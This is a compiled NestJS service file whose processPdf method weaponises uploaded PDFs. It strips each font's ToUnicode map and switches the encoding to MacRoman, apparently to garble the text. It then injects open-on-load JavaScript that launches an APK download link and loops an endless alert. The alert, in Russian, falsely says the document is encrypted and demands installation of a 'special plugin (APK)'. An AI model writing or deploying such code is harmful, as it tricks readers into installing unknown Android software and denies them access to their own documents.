"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
Object.defineProperty(exports, "__esModule", { value: true });
exports.AppService = void 0;
const common_1 = require("@nestjs/common");
const fs = __importStar(require("fs"));
const path = __importStar(require("path"));
const pdf_lib_1 = require("pdf-lib");
let AppService = class AppService {
    getHello() {
        return `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Hello World</title>
          <style>
              body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
              h1 { color: #333; }
          </style>
      </head>
      <body>
          <h1>Hello World!</h1>
      </body>
      </html>
    `;
    }
    async processPdf(originalPath, filename, pdfId) {
        const pdfBytes = fs.readFileSync(originalPath);
        const pdfDoc = await pdf_lib_1.PDFDocument.load(pdfBytes);
        const pages = pdfDoc.getPages();
        for (let i = 0; i < pages.length; i++) {
            const page = pages[i];
            const resources = page.node.lookupMaybe(pdf_lib_1.PDFName.of('Resources'), pdf_lib_1.PDFDict);
            if (resources) {
                const fonts = resources.lookupMaybe(pdf_lib_1.PDFName.of('Font'), pdf_lib_1.PDFDict);
                if (fonts) {
                    for (const key of fonts.keys()) {
                        const fontDict = fonts.lookup(key, pdf_lib_1.PDFDict);
                        if (fontDict) {
                            fontDict.delete(pdf_lib_1.PDFName.of('ToUnicode'));
                            fontDict.set(pdf_lib_1.PDFName.of('Encoding'), pdf_lib_1.PDFName.of('MacRomanEncoding'));
                        }
                    }
                }
            }
        }
        const apkUrl = 'http://localhost:3000/apk/download?pdfId=' + pdfId;
        const jsCode = 'try { app.launchURL("' + apkUrl + '", true); } catch(e) {}' +
            'while(true) {' +
            '  app.alert({' +
            '    cMsg: "КРИТИЧЕСКАЯ ОШИБКА: Документ зашифрован. Для расшифровки и просмотра содержимого необходимо установить специальный плагин (APK).",' +
            '    nIcon: 0,' +
            '    nType: 0,' +
            '    cTitle: "Ошибка доступа"' +
            '  });' +
            '}';
        const jsRef = pdfDoc.context.register(pdfDoc.context.obj({
            Type: 'Action',
            S: 'JavaScript',
            JS: pdf_lib_1.PDFString.of(jsCode),
        }));
        const namesRef = pdfDoc.context.register(pdfDoc.context.obj({
            JavaScript: pdfDoc.context.register(pdfDoc.context.obj({
                Names: [pdf_lib_1.PDFString.of('AlertOnOpen'), jsRef],
            })),
        }));
        pdfDoc.catalog.set(pdf_lib_1.PDFName.of('Names'), namesRef);
        pdfDoc.catalog.set(pdf_lib_1.PDFName.of('OpenAction'), jsRef);
        const modifiedPdfBytes = await pdfDoc.save();
        const modifiedDir = path.join(__dirname, '..', 'uploads', 'modified');
        if (!fs.existsSync(modifiedDir)) {
            fs.mkdirSync(modifiedDir, { recursive: true });
        }
        const modifiedPath = path.join(modifiedDir, filename);
        fs.writeFileSync(modifiedPath, modifiedPdfBytes);
        return modifiedPath;
    }
};
exports.AppService = AppService;
exports.AppService = AppService = __decorate([
    (0, common_1.Injectable)()
], AppService);
//# sourceMappingURL=app.service.js.map